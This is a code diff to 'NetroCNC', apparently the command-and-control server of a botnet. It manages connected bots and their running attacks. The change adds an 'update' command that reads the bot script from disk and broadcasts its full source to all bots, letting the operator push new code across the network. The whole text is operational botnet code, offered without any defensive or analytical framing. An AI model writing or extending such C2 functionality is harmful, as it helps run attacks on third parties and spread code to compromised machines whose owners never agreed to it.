@@ -138,6 +138,8 @@ class NetroCNC(object):
                 return self.command_bot_list()
             case "stop_all":
                 return self.command_stop_all()
+            case "update":
+                return self.command_update()
         
         return "Command not found. Type \"help\" to show the list of available commands."
     
@@ -410,6 +412,15 @@ class NetroCNC(object):
         self.broadcast_message(message={"op": "ATTACK_LIST", "running_attacks": {}})
 
         return f"Stopped {len(running_attacks)} attacks."
+
+    def command_update(self):
+        with open("netro_bot.py", "r") as file:
+            script_content = file.read()
+            file.close()
+        
+        self.broadcast_message(message={"op": "UPDATE", "script_content": script_content})
+
+        return "Successfully told bots to update."
 
     def store_attack(self, attack_payload: dict):
         attack_id = attack_payload["id"]
